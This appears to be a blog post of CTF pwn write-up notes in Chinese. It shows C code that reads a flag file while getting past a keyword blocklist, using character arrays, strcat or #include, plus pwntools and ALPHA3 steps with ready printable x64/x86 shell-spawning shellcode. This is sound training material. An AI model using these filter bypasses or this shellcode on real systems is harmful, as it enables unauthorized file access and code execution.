---
layout: post
title: "pwn writeups"
date: 2020-12-01 16:51:14 +0800
description: ""
category: ctf/bin
tags: []
---

#### 写C代码

DASCTF-May2020 × BJDCTF-3rd：[TaQiniOj-0](http://www.resery.top/2020/05/23/BJD%203nd%20&%20DASCTF%20%E4%BA%94%E6%9C%88%E6%9C%88%E8%B5%9Bwp)，禁用了关键字home|ctf|flag，使用字符数组，或者strcat拼接绕过

```c
#include<stdio.h>
#include <string.h>
int main(){
  char name[] = {'/','h','o','m','e','/','c','t','f','/','f','l','a','g','\0'};
  FILE* fp = NULL;
  char buff[255];
/*  char name[255];
  strcpy(name, "/hom");
  strcat(name, "e/ct");
  strcat(name, "f/fl");
  strcat(name, "ag");
*/
  fp = fopen(name, "r");
  fscanf(fp, "%s", buff);
  printf("%s", buff);
}
```

非预期：直接include

```c
#include "/home/ctf/fl\
ag"
```

#### 写shellcode

###### [shellcode范围printable](https://taqini.github.io/2020/03/31/alpha-shellcode-gen/)

sample：[shellcode_revenge](https://blog.csdn.net/weixin_44145820/article/details/105565953)，mrctf2020，借助[alpha3](https://github.com/TaQini/alpha3)

```
payload = asm(shellcraft.sh())
python ./ALPHA3.py x64 ascii mixedcase rax --input="sc.bin" > out.bin
#x64: Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t
#x86: Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2O7O0u7M7l1o1P0R7L0Y3T3D14000n000Q4q0f2s7n0Y0X020e3j2u1k000i013A7o4y3A114C1n0z0h4k4r0s
```

